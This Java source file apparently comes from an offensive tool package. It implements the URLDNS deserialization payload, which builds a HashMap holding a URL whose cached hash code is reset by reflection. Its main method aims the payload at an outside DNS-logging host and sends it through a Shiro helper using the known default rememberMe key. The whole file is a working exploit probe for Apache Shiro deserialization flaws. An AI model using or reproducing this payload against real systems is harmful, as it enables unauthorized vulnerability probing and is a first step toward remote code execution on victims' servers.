package com.summersec.attack.deser.payloads;

import com.summersec.attack.deser.frame.Shiro;
import com.summersec.attack.deser.payloads.annotation.Authors;
import com.summersec.attack.deser.payloads.annotation.Dependencies;
import com.summersec.attack.deser.payloads.annotation.PayloadTest;
import com.summersec.attack.deser.util.Reflections;
import java.io.IOException;
import java.net.InetAddress;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.util.HashMap;



@PayloadTest(skip = "true")
@Dependencies
@Authors({"GEBL"})
public class URLDNS {
    public Object getObject(String url) throws Exception {
        URLStreamHandler handler = new SilentURLStreamHandler();

        HashMap<Object, Object> ht = new HashMap<>();
        URL u = new URL(null, url, handler);
        ht.put(u, url);

        Reflections.setFieldValue(u, "hashCode", Integer.valueOf(-1));

        return ht;
    }

    public static void main(String[] args) throws Exception {
        Object dnslog = (new URLDNS()).getObject("http://ebaxo3.dnslog.cn");
        Shiro shiro = new Shiro();
        String sendpayload = shiro.sendpayload(dnslog, "kPH+bIxk5D2deZiIxcaaaA==");
        System.out.println(sendpayload);
    }




    static class SilentURLStreamHandler extends URLStreamHandler {
        @Override
        protected URLConnection openConnection(URL u) throws IOException {
            return null;
        }

        @Override
        protected synchronized InetAddress getHostAddress(URL u) {
            return null;
        }
    }
}




